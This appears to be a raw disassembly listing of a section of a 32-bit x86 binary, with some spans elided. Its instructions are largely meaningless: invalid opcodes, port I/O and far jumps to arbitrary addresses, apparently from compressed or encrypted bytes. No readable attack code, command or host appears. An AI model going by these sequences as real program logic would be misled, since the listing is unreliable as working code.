  4163a2:	repnz in al,0x65
  4163a5:	xlat   BYTE PTR ds:[ebx]
  4163a6:	int3   
  4163a7:	push   DWORD PTR [ebx]
  4163a9:	push   0x50
  4163ab:	cmp    DWORD PTR [eax],ebp
  4163ad:	jp     0x416401
  4163af:	fcom   st(1)
  4163b1:	mov    ds:0xc82b2612,eax
  4163b6:	add    DWORD PTR [eax],ebx
  4163b8:	sub    BYTE PTR [eax-0x4391afab],cl
  4163be:	aam    0x52
  4163c0:	mov    ?,WORD PTR [esi+0x1f]
  4163c3:	lahf   
  4163c4:	leave  
  4163c5:	in     eax,dx
  4163c6:	(bad)  
  4163c8:	pop    ds
  4163c9:	jmp    0x4163a6
  4163cb:	pop    ds
  4163cc:	ins    DWORD PTR es:[edi],dx
  4163cd:	adc    DWORD PTR [edx+0x66],eax
  4163d0:	xchg   edx,eax
  4163d2:	call   0xfb1ebf75
  4163d7:	cmc    
  4163d8:	mov    eax,0xa774cf38
  4163dd:	push   0x69
  4163df:	jb     0x416407
  4163e1:	xchg   ecx,eax
  4163e2:	adc    eax,0xed13cea9
  4163e7:	in     eax,dx
  4163e8:	sbb    ecx,ecx
  4163ea:	and    ecx,ebp
  4163ec:	stos   BYTE PTR es:[edi],al
  4163ed:	retf   
  4163ee:	shr    DWORD PTR [edi+0x51464a67],1
  4163f4:	mov    ebp,0xf5e8b42e
  4163f9:	jbe    0x4163af
  4163fb:	(bad)  [esp+0x77]
  4163ff:	sub    al,0xaf
  416401:	pop    es
  416402:	aaa    
  416403:	inc    ecx
  416404:	xor    esp,DWORD PTR [esi-0x77]
  416407:	retf   
  416408:	call   0x6646:0xa2c8af80
  41640f:	repnz test DWORD PTR ds:0x340979c4,ebx
  416416:	jl     0x416463
  416418:	push   edi
  416419:	les    ebx,FWORD PTR [eax-0x18]
  41641c:	jno    0x41645b
  41641e:	mov    dh,BYTE PTR [esp+ebx*1+0x6a82543]
  416425:	dec    esi
  416426:	pusha  
  416427:	out    dx,al
  416428:	pop    esi
  416429:	cmp    edi,DWORD PTR [esi-0x62]
  41642c:	int3   
  41642d:	jne    0x41647f
  41642f:	add    eax,0x13ccfb81
  416434:	mov    eax,eax
  416436:	test   eax,0x929dfd08
  41643b:	mov    ch,0x5c
  41643d:	add    dl,dl
  41643f:	lock (bad) 
	...
  4164b1:	add    BYTE PTR [eax],al
  4164b3:	add    ah,ah
  4164b5:	lock sub DWORD PTR [edx],ecx
  4164b8:	cmp    eax,0x4cfee7db
  4164bd:	or     BYTE PTR [ebx-0xa],ah
  4164c0:	test   DWORD PTR [ecx],edx
  4164c2:	cmp    dh,BYTE PTR [eax-0x19]
  4164c5:	repz add BYTE PTR [eax],al
  4164c8:	cmc    
  4164c9:	add    BYTE PTR [eax],al
  4164cb:	add    BYTE PTR [esi+0x5f],cl
  4164ce:	les    esp,FWORD PTR [ebp-0x5d]
  4164d1:	lods   eax,DWORD PTR ds:[esi]
  4164d2:	mov    ebp,0xb61059c5
  4164d7:	into   
  4164d8:	mov    esp,0x230a8272
  4164dd:	js     0x416529
  4164df:	aam    0x9f
  4164e1:	and    bh,ah
  4164e3:	es sub eax,0x4a302051
  4164e9:	xchg   DWORD PTR [ecx],edx
  4164eb:	mov    ds:0xd40d8dec,al
  4164f0:	sbb    DWORD PTR ds:0xf3f9db6d,ecx
  4164f6:	loop   0x41648c
  4164f8:	xor    edi,DWORD PTR ds:0xe6bd984c
  4164fe:	enter  0xbbb8,0x73
  416502:	in     al,0xb1
  416504:	das    
  416505:	pop    eax
  416506:	cmc    
  416507:	jnp    0x416518
  416509:	push   esi
  41650a:	aad    0x4a
  41650c:	xor    DWORD PTR [edx-0xc8ad2a8],edi
  416512:	xor    eax,0x88ff05d3
  416517:	xor    ebp,DWORD PTR [ebx]
  416519:	inc    esp
  41651a:	push   edx
  41651b:	clc    
  41651c:	push   cs
  41651d:	pop    esp
  41651e:	and    ebx,esp
  416520:	xor    esi,edx
  416522:	cmp    DWORD PTR [ebp-0x68491798],esp
  416528:	or     al,0x1c
  41652a:	jl     0x41659d
  41652c:	pop    ebx
  41652d:	into   
  41652e:	cs popa 
  416530:	jmp    0x41656d
  416532:	imul   edx,DWORD PTR [eax-0x6e],0xb26cfeeb
  416539:	pop    eax
  41653a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41653b:	repz sahf 
  41653d:	cmp    BYTE PTR [ecx+0x25],0xae
  416541:	cmp    eax,0x4876bc19
  416546:	cdq    
  416547:	rcr    BYTE PTR [ebx-0x4833b689],1
  41654d:	mov    edi,0x4364d90b
  416552:	aad    0xd4
  416554:	xor    DWORD PTR [eax],edx
  416556:	push   0xcbd1026e
  41655b:	mov    ebp,0x7bc65b45
  416560:	inc    ecx
  416561:	inc    esi
  416562:	jae    0x416561
  416564:	dec    edi
  416565:	inc    edi
  416566:	mov    ch,0x4
  416568:	std    
  416569:	pop    es
  41656a:	ja     0x4164ec
  41656c:	jno    0x4164ff
  41656e:	lods   eax,DWORD PTR ds:[esi]
  41656f:	sar    DWORD PTR [edi],0xfc
  416572:	test   DWORD PTR [esi+ebx*1+0xca189d1],edi
  416579:	push   esp
  41657a:	bound  eax,QWORD PTR [edi+0x49]
  41657d:	xchg   ebp,eax
  41657e:	push   ds
  41657f:	mov    esi,0x35fa8b87
  416584:	leave  
  416585:	mov    WORD PTR [ebp-0x34840889],ss
  41658b:	add    DWORD PTR [ebx+ecx*1],ebx
  41658e:	or     ecx,edi
  416590:	cs mov ch,0x43
  416593:	jbe    0x416595
  416595:	add    ecx,0x4
  416598:	cmp    edx,esi
  41659a:	inc    esp
  41659b:	cwde   
  41659c:	sbb    BYTE PTR [edi],bh
  41659e:	dec    ebp
  41659f:	out    0x1,eax
  4165a1:	jbe    0x416612
  4165a3:	pop    eax
  4165a4:	sbb    eax,0xbe72642e
  4165a9:	jnp    0x4165a9
  4165ab:	fdivr  QWORD PTR [edx-0x10877f41]
  4165b1:	ds push eax
  4165b3:	pop    ecx
  4165b4:	mov    bl,0xcf
  4165b6:	xlat   BYTE PTR ds:[ebx]
  4165b7:	(bad)  
  4165b9:	repnz xchg esp,eax
  4165bb:	shr    DWORD PTR [edx],1
  4165bd:	adc    ch,BYTE PTR ds:0x7af6
	...
  416633:	add    BYTE PTR [ebp-0x66],ch
  416636:	mov    esp,0xfd67ff45
  41663b:	mov    edx,0xd5f418cb
  416640:	sbb    al,0xd9
  416642:	sub    dh,BYTE PTR [edx]
  416644:	fdivr  st(4),st
  416646:	add    BYTE PTR [eax],al
  416648:	cmc    
  416649:	add    BYTE PTR [eax],al
  41664b:	add    BYTE PTR [esi],bh
  41664d:	adc    al,0x98
  41664f:	jg     0x4165eb
  416651:	adc    BYTE PTR [ecx],al
  416653:	pop    edi
  416654:	jne    0x4165e0
  416656:	pop    ebp
  416657:	in     eax,dx
  416658:	bound  esp,QWORD PTR [ecx+0x5f2d904e]
  41665e:	add    ch,al
  416660:	xchg   ebp,eax
  416661:	fisttp QWORD PTR [edi+0x91e025b]
  416667:	cld    
  416668:	cwde   
  416669:	inc    ebx
  41666a:	dec    eax
  41666b:	add    BYTE PTR [eax+edx*1],dh
  41666e:	cmc    
  41666f:	inc    al
  416671:	xchg   ecx,eax
  416672:	adc    esp,DWORD PTR [edi-0x3e]
  416675:	stos   BYTE PTR es:[edi],al
  416676:	or     eax,0x97efd02c
  41667b:	nop
  41667c:	lods   al,BYTE PTR ds:[esi]
  41667d:	dec    eax
  41667e:	fdivr  QWORD PTR [ecx+0x734cf4b4]
  416684:	jae    0x4166f5
  416686:	int    0xb4
  416688:	pop    esi
  416689:	xchg   ebx,eax
  41668a:	cs dec eax
  41668c:	gs dec ecx
  41668e:	js     0x416646
  416690:	push   esi
  416691:	lods   al,BYTE PTR ds:[esi]
  416692:	mov    ch,0x65
  416694:	ins    BYTE PTR es:[edi],dx
  416695:	aad    0xbe
  416697:	arpl   si,bx
  416699:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  41669b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41669c:	adc    DWORD PTR [eax+0x132f49ab],0x31f6d4cd
  4166a6:	cmp    bh,BYTE PTR [edi+0x9]
  4166a9:	leave  
  4166aa:	cdq    
  4166ab:	rcr    edx,1
  4166ad:	push   edx
  4166ae:	out    0x37,eax
  4166b0:	sbb    eax,edx
  4166b2:	leave  
  4166b3:	cdq    
  4166b4:	mov    ebx,edx
  4166b6:	lds    edi,FWORD PTR [ecx]
  4166b8:	or     al,0xfb
  4166ba:	popa   
  4166bb:	jp     0x416735
  4166bd:	mov    DWORD PTR [esi+0x4ce0fa40],ebx
  4166c3:	inc    eax
  4166c4:	pop    eax
  4166c5:	dec    esp
  4166c6:	inc    esp
  4166c7:	and    bl,al
  4166c9:	leave  
  4166ca:	loop   0x416713
  4166cc:	and    esp,ecx
  4166ce:	mov    bl,0xfe
  4166d0:	cmc    
  4166d1:	mov    ds:0xcca2e820,eax
  4166d6:	pop    edx
  4166d7:	ss into 
  4166d9:	mov    BYTE PTR [edi],dh
  4166db:	adc    DWORD PTR [eax-0x28b11a9a],ecx
  4166e1:	pop    edi
  4166e2:	lods   eax,DWORD PTR ds:[esi]
  4166e3:	mov    edi,0x1693e367
  4166e8:	jp     0x416762
  4166ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4166eb:	xchg   bl,dh
  4166ed:	xchg   edx,eax
  4166ee:	jl     0x4166b8
  4166f0:	sahf   
  4166f1:	(bad)  
  4166f3:	jge    0x41676d
  4166f5:	fst    DWORD PTR [esi+eiz*8]
  4166f8:	push   ebx
  4166f9:	sub    DWORD PTR es:[ecx],ecx
  4166fc:	iret   
  4166fd:	out    dx,al
  4166fe:	les    esp,FWORD PTR [ebx]
  416700:	mov    edx,0xedd2fb3
  416705:	dec    esp
  416706:	and    eax,DWORD PTR [edx+0x26]
  416709:	nop
  41670a:	xchg   esp,eax
  41670b:	xchg   ebx,eax
  41670c:	sbb    ch,bh
  41670e:	shl    DWORD PTR [ecx+esi*8],cl
  416711:	xchg   ebp,eax
  416712:	push   es
  416713:	test   BYTE PTR [ebp-0x45316092],0x37
  41671a:	and    bl,BYTE PTR [edi+ecx*8-0x31]
  41671e:	repnz cmp al,0xc5
  416721:	clc    
  416722:	inc    eax
  416723:	or     dh,BYTE PTR [edi]
  416725:	cdq    
  416726:	sub    BYTE PTR [edi-0x152e270c],al
  41672c:	push   esi
  41672d:	push   0xbbd50e88
  416732:	cwde   
  416733:	(bad)  
  416735:	pop    edi
  416736:	clc    
  416737:	mov    ds:0xdf63ebb8,al
  41673c:	loopne 0x416708
  41673e:	jmp    0x41edbd
	...
  4167b3:	add    bl,cl
  4167b5:	(bad)  
  4167b6:	xchg   ebx,eax
  4167b7:	in     al,dx
  4167b8:	mov    bh,0xed
  4167ba:	(bad)  
  4167bb:	push   DWORD PTR [ecx+0x19]
  4167be:	comiss xmm6,DWORD PTR [edi]
  4167c1:	pop    edi
  4167c2:	ror    DWORD PTR [ebp+0xf5d1],0xf5
  4167c9:	add    BYTE PTR [eax],al
  4167cb:	add    BYTE PTR ds:0x5bb5fe2f,cl
  4167d1:	cmp    bl,al
  4167d3:	and    eax,0x80a84211
  4167d8:	pusha  
  4167d9:	pusha  
  4167da:	shl    dl,0x8
  4167dd:	outs   dx,BYTE PTR ds:[esi]
  4167de:	sti    
  4167df:	cmp    dh,BYTE PTR [esp+edi*2-0x12190152]
  4167e6:	fnstcw WORD PTR [ebx+eiz*4]
  4167e9:	mov    ecx,0x8e1e2abf
  4167ee:	retf   
  4167ef:	icebp  
  4167f0:	fwait
  4167f1:	inc    ecx
  4167f2:	dec    ecx
  4167f3:	clc    
  4167f4:	jae    0x416835
  4167f6:	addr16 jmp 0xfcc6:0xafa9be84
  4167fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4167ff:	dec    edi
  416800:	sbb    edi,DWORD PTR ds:[eax+0x38]
  416804:	dec    ecx
  416805:	dec    edi
  416806:	mov    al,ds:0x53ff9698
  41680b:	xchg   esi,eax
  41680c:	je     0x4167eb
  41680e:	dec    ebp
  41680f:	jnp    0x4167b4
  416811:	out    0xd4,eax
  416813:	scas   al,BYTE PTR es:[edi]
  416814:	lea    ebp,[edx]
  416816:	cdq    
  416817:	pop    esi
  416818:	aad    0x45
  41681a:	mov    esi,DWORD PTR [esi]
  41681c:	mov    gs,WORD PTR [ebp+0x65]
  41681f:	sahf   
  416820:	push   ss
  416821:	sub    dh,bh
  416823:	xchg   ebx,eax
  416824:	mov    cl,bl
  416826:	sub    al,0x17
  416828:	jbe    0x416853
  41682a:	mov    ecx,0x269ebe97
  41682f:	xor    cl,0xa2
  416832:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416833:	dec    ebp
  416834:	std    
  416835:	pop    ss
  416836:	mov    ds:0xe60af48d,al
  41683b:	retf   0x84b0
  41683e:	fucomip st,st(0)
  416840:	repnz mov edx,ss
  416843:	aam    0x96
  416845:	retf   0x7f4a
  416848:	jecxz  0x41687b
  41684a:	mov    esp,0x50e9bec8
  41684f:	outs   dx,BYTE PTR ds:[esi]
  416850:	cdq    
  416851:	bound  eax,QWORD PTR cs:[eax-0x2e237c15]
  416858:	out    0xb0,eax
  41685a:	adc    DWORD PTR [eax],0x22
  41685d:	add    ebx,DWORD PTR [esi+0x16fc6776]
  416863:	dec    edi
  416864:	inc    edi
  416865:	in     eax,dx
  416866:	jg     0x416838
  416868:	lock fstp DWORD PTR [ebp+0x86065f6]
  41686f:	add    eax,edx
  416871:	or     BYTE PTR [ebp+edi*4+0x5f],0x25
  416876:	(bad)  
  416877:	das    
  416878:	stc    
  416879:	cmp    eax,0x87e05827
  41687e:	or     BYTE PTR [ebp-0xd],0x3c
  416882:	mov    ebx,0xe034c1ce
  416887:	mov    dl,BYTE PTR [ebx-0x2d]
  41688a:	fs inc ecx
  41688c:	dec    edx
  41688d:	jb     0x4168ae
  41688f:	sti    
  416890:	push   esi
  416891:	sub    dl,BYTE PTR [edi+0xfff982a]
  416897:	pop    edx
  416898:	test   al,0xcc
  41689a:	pop    esp
  41689b:	xchg   edx,eax
  41689c:	ja     0x4168b2
  41689e:	dec    edx
  41689f:	jnp    0x41689f
  4168a1:	ss xchg esp,eax
  4168a3:	mov    ch,0x1b
  4168a5:	dec    ebx
  4168a6:	push   ecx
  4168a7:	jns    0x4168b9
  4168a9:	push   DWORD PTR [ebx]
  4168ab:	ret    0x86c5
  4168ae:	test   al,0x8a
  4168b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4168b1:	lock fadd QWORD PTR [edi-0x761e52db]
  4168b8:	sahf   
  4168b9:	popf   
  4168ba:	popa   
  4168bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4168bc:	add    BYTE PTR [ecx],ch
  4168be:	adc    esp,DWORD PTR [esi-0x2f]
	...
  416931:	add    BYTE PTR [eax],al
  416933:	add    BYTE PTR [ebp-0x78],al
  416936:	sub    al,0x77
  416938:	in     eax,dx
  416939:	neg    DWORD PTR [edi-0x46]
  41693c:	push   eax
  41693d:	inc    ebp
  41693e:	push   ss
  41693f:	xor    DWORD PTR [ebx+0x45],ebp
  416942:	pop    ebp
  416943:	imul   eax,esi,0xfffffff6
  416946:	add    BYTE PTR [eax],al
  416948:	cmc    
  416949:	add    BYTE PTR [eax],al
  41694b:	add    BYTE PTR [ebx-0x41647e61],bl
  416951:	mul    bl
  416953:	push   ss
  416954:	mov    esi,0x95e66deb
  416959:	fs jle 0x41690e
  41695c:	lods   eax,DWORD PTR ds:[esi]
  41695d:	mov    edi,ebp
  41695f:	jmp    0xd814f83c
  416964:	inc    esp
  416965:	addr16 xchg esi,eax
  416967:	dec    ebp
  416968:	es pop eax
  41696a:	pop    ecx
  41696b:	adc    al,BYTE PTR [edx+0x5641fd84]
  416971:	lods   eax,DWORD PTR ds:[esi]
  416972:	test   dl,cl
  416974:	push   ebx
  416975:	dec    esp
  416976:	xchg   BYTE PTR [ebp+0x5e56088d],al
  41697c:	and    ah,dh
  41697e:	bound  esp,QWORD PTR [esi-0x72c80ec3]
  416984:	cwde   
  416985:	inc    esi
  416986:	(bad)  
  416987:	retf   
  416988:	(bad)  
  416989:	leave  
  41698a:	dec    ebx
  41698b:	out    dx,eax
  41698c:	push   ss
  41698d:	jo     0x416911
  41698f:	icebp  
  416990:	mov    ds:0x2b6d93b0,eax
  416995:	neg    DWORD PTR [edi]
  416997:	inc    ebx
  416998:	dec    ecx
  416999:	xor    esp,edi
  41699b:	je     0x4169e5
  41699d:	push   esp
  41699e:	xor    eax,0x8d5ebe2a
  4169a3:	and    edx,DWORD PTR [edi+0x45]
  4169a6:	adc    eax,0x3230d573
  4169ab:	dec    edi
  4169ac:	mov    bh,0x3f
  4169ae:	sub    edx,0xf85abff9
  4169b4:	(bad)  
  4169b5:	bound  edx,QWORD PTR [edx*2+0x7a997785]
  4169bc:	dec    edx
  4169bd:	sub    DWORD PTR [edi+ebp*1],ecx
  4169c0:	cmp    eax,esp
  4169c2:	fcomp  st(5)
  4169c4:	mov    cl,0x2e
  4169c6:	lock call 0xb4e5:0xdf7f03cb
  4169ce:	or     edi,eax
  4169d0:	mov    eax,ds:0x997aae38
  4169d5:	shl    DWORD PTR [esi-0x56],cl
  4169d8:	imul   DWORD PTR [eax+0x6dfef75d]
  4169de:	pop    ds
  4169df:	packuswb mm2,QWORD PTR ds:0x260c40f7
  4169e6:	test   BYTE PTR [esi],al
  4169e8:	popf   
  4169e9:	add    al,0xf4
  4169eb:	icebp  
  4169ec:	xor    dh,BYTE PTR [eax+edx*2+0x49]
  4169f0:	inc    eax
  4169f1:	enter  0x80d4,0x29
  4169f5:	xchg   edi,eax
  4169f6:	leave  
  4169f7:	enter  0x3568,0xf7
  4169fb:	cmp    ebp,DWORD PTR [ebp-0x1a211cac]
  416a01:	push   edx
  416a02:	cmp    dl,dl
  416a04:	mov    al,ds:0x303c2e6f
  416a09:	dec    ebx
  416a0a:	aam    0x49
  416a0c:	mov    BYTE PTR [esi+0xc],cl
  416a0f:	stc    
  416a10:	jmp    0x8cdd3b3d
  416a15:	sbb    DWORD PTR [ecx],edx
  416a17:	iret   
  416a18:	int3   
  416a19:	mov    ecx,0x16d14ae4
  416a1e:	mov    cl,0xf9
  416a20:	adc    al,0x1d
  416a22:	lds    ebp,FWORD PTR [ebx]
  416a24:	push   cs
  416a25:	xor    eax,0x2ec2f95a
  416a2a:	inc    ebp
  416a2b:	jo     0x416a32
  416a2d:	adc    al,0x7a
  416a2f:	pop    ecx
  416a30:	xor    ebx,DWORD PTR [edi+0x4c]
  416a33:	pop    edi
  416a34:	(bad)  
  416a35:	outs   dx,BYTE PTR ds:[esi]
  416a36:	fwait
  416a37:	or     al,0xed
  416a39:	(bad)  
  416a3a:	int3   
  416a3b:	push   edx
  416a3c:	mov    ebx,0xf7a91c2c
	...
  416ab1:	add    BYTE PTR [eax],al
  416ab3:	add    bh,bl
  416ab5:	mov    esi,0xbb659205
  416aba:	(bad)  
  416abc:	nop
  416abd:	fmul   QWORD PTR [ebx+0x52cce052]
  416ac3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416ac4:	mov    ebx,0xf50000f7
  416ac9:	add    BYTE PTR [eax],al
  416acb:	add    BYTE PTR [eax+0x30],dl
  416ace:	mov    ebp,0x182bef5b
  416ad3:	xchg   DWORD PTR [eax+0x12],eax
  416ad6:	jmp    FWORD PTR [eax+0x5df986d4]
  416adc:	nop
  416add:	jg     0x416a74
  416adf:	inc    ebp
  416ae0:	xor    eax,0x8766bc97
  416ae5:	or     DWORD PTR [ebx+0x68e7ef6a],eax
  416aeb:	and    DWORD PTR [ecx],esi
  416aed:	retf   0x946d
  416af0:	mov    ecx,0xe388c1fa
  416af5:	push   cs
  416af6:	call   0x4b97:0xf7305244
  416afd:	into   
  416afe:	nop
  416aff:	rcr    BYTE PTR [ebx],0xb7
  416b02:	jns    0x416b64
  416b04:	xchg   esp,eax
  416b05:	xchg   esi,eax
  416b06:	jge    0x416b7c
  416b08:	dec    ecx
  416b09:	add    dl,BYTE PTR [ecx+esi*1]
  416b0c:	das    
  416b0d:	nop
  416b0e:	pop    edi
  416b0f:	ss stos BYTE PTR es:[edi],al
  416b11:	jl     0x416b38
  416b13:	mov    BYTE PTR [eax],cl
  416b15:	cmp    al,0xa4
  416b17:	adc    bh,BYTE PTR [ecx-0x633ce4a5]
  416b1d:	sub    al,0xac
  416b1f:	xchg   ecx,eax
  416b20:	inc    edx
  416b21:	jne    0x416ac0
  416b23:	mov    cl,0xf7
  416b25:	into   
  416b26:	retf   
  416b27:	mov    dl,0x89
  416b29:	sub    eax,0x15ec67fb
  416b2e:	xchg   ebp,eax
  416b2f:	add    eax,0x6d0fa439
  416b34:	jmp    0x4eff:0xddbd72f8
  416b3b:	fs leave 
  416b3d:	ds pushf 
  416b3f:	xchg   edi,eax
  416b40:	and    bl,BYTE PTR [ebp+0x15c6731a]
  416b46:	into   
  416b47:	arpl   WORD PTR [ebx],di
  416b49:	mov    esi,0xb81b315f
  416b4e:	(bad)  
  416b4f:	retf   
  416b50:	mov    ecx,0x7768693e
  416b55:	push   0x1d91c659
  416b5a:	neg    DWORD PTR [edi]
  416b5c:	add    edi,DWORD PTR [edx-0x71356ef2]
  416b62:	in     eax,0x1
  416b64:	hlt    
  416b65:	xchg   ebp,eax
  416b66:	mov    eax,ds:0xbbe97322
  416b6b:	inc    ecx
  416b6c:	push   es
  416b6d:	popa   
  416b6e:	jns    0x416aff
  416b70:	and    ecx,ecx
  416b72:	push   es
  416b73:	ja     0x416b80
  416b75:	int    0x98
  416b77:	rcl    edi,cl
  416b79:	fdiv   DWORD PTR [esi+0x4a]
  416b7c:	cdq    
  416b7d:	repz fild DWORD PTR ds:0xf77c95de
  416b84:	outs   dx,DWORD PTR ds:[esi]
  416b85:	addr16 popa 
  416b87:	jle    0x416b14
  416b89:	imul   esp,DWORD PTR [esi+ebp*1],0x3d
  416b8d:	data16 das 
  416b8f:	aas    
  416b90:	xchg   edi,eax
  416b91:	daa    
  416b92:	fistp  WORD PTR [esi-0x40cdce69]
  416b98:	sbb    eax,0x85c39cce
  416b9d:	push   0x925af2c0
  416ba2:	(bad)  
  416ba3:	sub    DWORD PTR [ecx-0x3d6c2f1c],ebx
  416ba9:	sahf   
  416baa:	add    DWORD PTR [edx],0x5e7ac77f
  416bb0:	data16 xor al,0x66
  416bb3:	mov    ch,0x23
  416bb5:	push   0x37fa947f
  416bba:	pop    ss
  416bbb:	push   ss
  416bbc:	sahf   
  416bbd:	mov    ecx,0x8a3bc
	...
  416c32:	add    BYTE PTR [eax],al
  416c34:	cmp    dl,BYTE PTR [eax]
  416c36:	mov    edi,0xbbbfbf3c
  416c3b:	push   ss
  416c3c:	add    ebx,DWORD PTR [eax-0x29]
  416c3f:	adc    ebx,DWORD PTR [eax+0x9]
  416c42:	sbb    eax,0xf8b054
  416c47:	add    ch,dh
  416c49:	add    BYTE PTR [eax],al
  416c4b:	add    BYTE PTR [eax-0x24cf453b],bl
  416c51:	lea    ecx,[eax-0x98e1fec]
  416c57:	mov    edi,0x80cbc086
  416c5c:	xor    DWORD PTR fs:[edx-0x6ec1130f],0x50
  416c64:	jb     0x416ce0
  416c66:	xchg   esp,eax
  416c67:	push   ebp
  416c68:	xchg   edi,eax
  416c69:	cmp    DWORD PTR [ecx+0x5aedb300],ebp
  416c6f:	jne    0x416c6c
  416c71:	rcr    BYTE PTR [ebp+0x121cf20a],0x27
  416c78:	xchg   ebp,eax
  416c79:	retf   
  416c7a:	push   ebp
  416c7b:	and    ebx,DWORD PTR [esp]
  416c7e:	and    eax,0x5daa3abb
  416c83:	adc    ebp,DWORD PTR [ebx+0x5408097d]
  416c89:	pop    edi
  416c8a:	lods   al,BYTE PTR ds:[esi]
  416c8b:	in     al,dx
  416c8c:	dec    esp
  416c8d:	xchg   esi,eax
  416c8e:	xchg   BYTE PTR [ecx-0x5048af25],cl
  416c94:	dec    ecx
  416c95:	sub    al,0xf7
  416c97:	fsub   st(4),st
  416c99:	leave  
  416c9a:	xor    al,0x47
  416c9c:	test   DWORD PTR [edx-0x7d],ebx
  416c9f:	push   cs
  416ca0:	(bad)  
  416ca1:	push   eax
  416ca2:	std    
  416ca3:	jg     0x416c44
  416ca5:	dec    ebp
  416ca6:	repnz sahf 
  416ca8:	pop    ebp
  416ca9:	add    edi,0xe90d1124
  416caf:	jne    0x416cfe
  416cb1:	xacquire xchg BYTE PTR [edi-0x2430ceab],ah
  416cb8:	scas   eax,DWORD PTR es:[edi]
  416cb9:	inc    ebx
  416cba:	mov    edx,0x9ef94657
  416cbf:	and    esp,edx
  416cc1:	inc    edi
  416cc2:	jo     0x416cf6
  416cc4:	dec    ebx
  416cc5:	dec    DWORD PTR [ebp-0x4182d585]
  416ccb:	fwait
  416ccc:	ins    BYTE PTR es:[edi],dx
  416ccd:	jmp    0x416c50
  416ccf:	ds dec ebx
  416cd1:	lea    ebp,[ecx]
  416cd3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416cd4:	sbb    cl,ch
  416cd6:	cmp    dl,BYTE PTR [ecx]
  416cd8:	or     al,0xc6
  416cda:	and    ch,BYTE PTR [esi-0x3c]
  416cdd:	mov    WORD PTR [edi-0x66],cs
  416ce0:	test   eax,0x2e910852
  416ce5:	jns    0x416cc4
  416ce7:	test   eax,0xae36462c
  416cec:	or     eax,0xb993d92c
  416cf1:	das    
  416cf2:	idiv   DWORD PTR [ebx]
  416cf4:	mov    DWORD PTR ds:0xea9c6aea,edx
  416cfa:	inc    ebp
  416cfb:	arpl   WORD PTR [eax+0x70ddecb1],di
  416d01:	adc    ebx,edi
  416d03:	xor    BYTE PTR [edi-0x64357a6d],ch
  416d09:	iret   
  416d0a:	cmp    BYTE PTR ds:0xe4d2c0ce,cl
  416d10:	int    0xb0
  416d12:	push   edi
  416d13:	(bad)  [ebx]
  416d15:	icebp  
  416d16:	inc    esi
  416d17:	clc    
  416d18:	xlat   BYTE PTR ds:[ebx]
  416d19:	in     al,0xb1
  416d1b:	mov    edi,0x5bfd8e92
  416d20:	push   0xc7366652
  416d25:	outs   dx,BYTE PTR ds:[esi]
  416d26:	and    edi,DWORD PTR [edx]
  416d28:	xchg   BYTE PTR [ebp-0xf],dh
  416d2b:	pusha  
  416d2c:	sti    
  416d2d:	dec    eax
  416d2e:	pop    esi
  416d2f:	lock loope 0x416d89
  416d32:	and    DWORD PTR ds:0x646a342c,edi
  416d38:	sub    DWORD PTR ds:0x245f01d6,ebx
  416d3e:	jnp    0x416d31
  416d40:	xor    eax,DWORD PTR [eax]
	...
  416db2:	add    BYTE PTR [eax],al
  416db4:	out    dx,al
  416db5:	repnz cmc 
  416db7:	add    edi,ebp
  416db9:	pop    es
  416dba:	(bad)  
  416dbb:	inc    edx
  416dbd:	xchg   ebx,eax
  416dbe:	pusha  
  416dbf:	push   0xa49f93c5
  416dc4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416dc5:	stc    
  416dc6:	add    BYTE PTR [eax],al
  416dc8:	cmc    
  416dc9:	add    BYTE PTR [eax],al
  416dcb:	add    BYTE PTR ds:0x6e9ae1af,al
  416dd1:	mov    edx,0x1a8ef17d
  416dd6:	pusha  
  416dd7:	ins    BYTE PTR es:[edi],dx
  416dd8:	fld    TBYTE PTR [esi+edx*1]
  416ddb:	dec    edx
  416ddc:	mov    edx,0xed78df2
  416de1:	inc    esp
  416de2:	add    eax,0x9623709c
  416de7:	fadd   QWORD PTR [ebx+edx*8]
  416dea:	hlt    
  416deb:	hlt    
  416dec:	ins    DWORD PTR es:[edi],dx
  416ded:	les    ebp,FWORD PTR [ebx+ecx*4]
  416df0:	xor    DWORD PTR [ebx+esi*4+0x4c065b66],esi
  416df7:	ins    BYTE PTR es:[edi],dx
  416df8:	adc    edx,DWORD PTR ds:0x1a3acc20
  416dfe:	fsubrp st(3),st
  416e00:	arpl   dx,bp
  416e02:	inc    DWORD PTR [esi-0x53]
  416e05:	lahf   
  416e06:	and    edx,DWORD PTR [ebx-0x33]
  416e09:	adc    al,0x44
  416e0b:	adc    BYTE PTR [ebx+0x4d],bh
  416e0e:	sar    BYTE PTR [ebp+0x60],cl
  416e11:	sub    eax,0x20b1d649
  416e16:	add    edi,ebx
  416e18:	imul   ebp,DWORD PTR [ecx],0xffffff99
  416e1b:	and    DWORD PTR [ebx-0x693843f7],0x40
  416e22:	jmp    0x416e5a
  416e24:	jo     0x416e0a
  416e26:	push   ss
  416e27:	cs mov ebp,0x6bfd227
  416e2d:	imul   esp,DWORD PTR [eax-0x3113b56d],0x4d309a0
  416e37:	pop    esp
  416e38:	(bad)  [ebx-0x1c6508cc]
  416e3e:	sbb    eax,0x348aef15
  416e43:	pop    ds
  416e44:	je     0x416e00
  416e46:	test   al,0x45
  416e48:	mov    esi,0x75755237
  416e4d:	mov    dh,0x7e
  416e4f:	adc    eax,0x66c9faba
  416e54:	test   DWORD PTR [eax],ebx
  416e56:	in     eax,0xfe
  416e58:	dec    ecx
  416e59:	sbb    edx,DWORD PTR cs:[eax-0x1acb7708]
  416e60:	mov    bh,0xbe
  416e62:	cdq    
  416e63:	adc    ah,dl
  416e65:	sbb    DWORD PTR [edx+0x153717a9],esi
  416e6b:	add    al,0x26
  416e6d:	jg     0x416e08
  416e6f:	cmp    al,0x14
  416e71:	cdq    
  416e72:	or     esi,DWORD PTR [ecx+0x76cdad4b]
  416e78:	mov    dh,0xa9
  416e7a:	sbb    esi,esp
  416e7c:	dec    esp
  416e7d:	in     eax,0x5f
  416e7f:	inc    esi
  416e80:	inc    ebp
